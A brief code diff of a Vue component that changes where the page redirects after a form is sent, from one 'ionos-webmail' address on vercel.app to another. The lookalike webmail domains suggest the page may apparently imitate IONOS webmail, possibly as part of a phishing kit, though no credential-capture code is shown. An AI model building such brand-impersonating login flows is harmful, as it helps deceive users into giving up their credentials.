@@ -38,7 +38,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://ionos-webmail-ajxf.vercel.app/");
+        location.replace("https://ionos-webmail-swart.vercel.app/main");
       }
     },
 
@@ -62,7 +62,6 @@ export default {
   },
 };
 </script>
-
 
 <template>
   <main class="page-shell">
